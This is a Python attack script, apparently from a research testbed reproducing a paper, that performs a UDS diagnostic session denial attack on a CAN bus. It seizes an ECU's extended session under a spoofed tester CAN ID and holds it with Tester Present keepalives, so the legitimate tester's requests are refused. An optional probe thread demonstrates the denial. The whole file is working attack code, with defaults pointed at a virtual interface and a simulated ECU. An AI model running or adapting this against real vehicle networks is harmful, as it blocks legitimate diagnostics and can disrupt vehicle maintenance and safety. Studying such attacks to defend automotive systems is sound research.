"""Session denial attack (paper Section V-B).

Seizes a non-default UDS diagnostic session by sending 0x10 (Diagnostic
Session Control) from a second tester identity, then sends 0x3E (Tester
Present) on an interval short enough to keep refreshing the ECU's S3 timeout.
While the session is held, a legitimate tester's own 0x10 requests should be
refused (NRC 0x22, conditionsNotCorrect) or ignored -- run this against
`stateful_ecu.py`, not `fake_ecu.py`, since the latter has no session state
to seize (every request there is answered independent of who sent it).

SocketCAN's isotp module distinguishes peers by CAN ID pair rather than an
in-payload source address, so "spoofing" here means transmitting as a second
tester identity (attacker tx/rx ID pair) distinct from the legitimate
tester's ID pair -- the ECU has no way to tell these apart other than the
CAN ID, which is exactly the authentication gap the paper describes.

Usage:
    python3 attacks/session_denial.py --interface vcan0 --duration 15 --probe
"""

from __future__ import annotations

import argparse
import socket as socket_module
import threading
import time


def build_session_control(session: int) -> bytes:
    return bytes([0x10, session])


def build_tester_present() -> bytes:
    return bytes([0x3E, 0x00])


def classify_session_response(resp: bytes | None) -> str:
    if resp is None:
        return "timeout"
    if len(resp) >= 2 and resp[0] == 0x50:
        return "granted"
    if len(resp) >= 3 and resp[0] == 0x7F and resp[1] == 0x10:
        return f"denied(nrc=0x{resp[2]:02X})"
    return f"unexpected({resp.hex(' ')})"


def describe(resp: bytes | None) -> str:
    return "timeout" if resp is None else resp.hex(" ")


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--interface", default="vcan0")
    parser.add_argument("--rx-id", type=lambda x: int(x, 0), default=0x7E9, help="ECU's response ID to the attacker identity")
    parser.add_argument("--tx-id", type=lambda x: int(x, 0), default=0x7E1, help="ECU's request ID for the attacker identity")
    parser.add_argument("--session", type=lambda x: int(x, 0), default=0x03, help="session type to seize (0x03 = extendedDiagnosticSession)")
    parser.add_argument("--keepalive-interval", type=float, default=2.0, help="seconds between TesterPresent frames")
    parser.add_argument("--duration", type=float, default=15.0, help="seconds to hold the session (<=0 = until Ctrl+C)")
    parser.add_argument("--probe", action="store_true", help="also probe as the legitimate tester to show denial live")
    parser.add_argument("--probe-rx-id", type=lambda x: int(x, 0), default=0x7E8)
    parser.add_argument("--probe-tx-id", type=lambda x: int(x, 0), default=0x7E0)
    parser.add_argument("--probe-interval", type=float, default=1.0)
    parser.add_argument("--response-timeout", type=float, default=0.2)
    return parser.parse_args()


def _recv(sock) -> bytes | None:
    try:
        return sock.recv()
    except socket_module.timeout:
        return None


def _probe_loop(interface: str, rx_id: int, tx_id: int, session: int, interval: float, timeout: float, stop: threading.Event) -> None:
    import isotp

    sock = isotp.socket()
    sock.bind(interface, isotp.Address(rxid=rx_id, txid=tx_id))
    sock.settimeout(timeout)
    request = build_session_control(session)
    while not stop.is_set():
        sock.send(request)
        result = classify_session_response(_recv(sock))
        print(f"[legit probe] 0x10 session=0x{session:02X} -> {result}", flush=True)
        stop.wait(interval)


def main() -> None:
    import isotp

    args = parse_args()
    sock = isotp.socket()
    sock.bind(args.interface, isotp.Address(rxid=args.rx_id, txid=args.tx_id))
    sock.settimeout(args.response_timeout)

    print(f"[attacker] seizing session 0x{args.session:02X} on {args.interface} (tx=0x{args.tx_id:03X}, rx=0x{args.rx_id:03X})")
    sock.send(build_session_control(args.session))
    print(f"[attacker] 0x10 -> {classify_session_response(_recv(sock))}", flush=True)

    stop = threading.Event()
    probe_thread = None
    if args.probe:
        probe_thread = threading.Thread(
            target=_probe_loop,
            args=(args.interface, args.probe_rx_id, args.probe_tx_id, args.session, args.probe_interval, args.response_timeout, stop),
            daemon=True,
        )
        probe_thread.start()

    deadline = time.monotonic() + args.duration if args.duration > 0 else None
    try:
        while deadline is None or time.monotonic() < deadline:
            time.sleep(args.keepalive_interval)
            sock.send(build_tester_present())
            print(f"[attacker] 0x3E -> {describe(_recv(sock))}", flush=True)
    except KeyboardInterrupt:
        pass
    finally:
        stop.set()
        if probe_thread:
            probe_thread.join(timeout=args.response_timeout + 1)


if __name__ == "__main__":
    main()
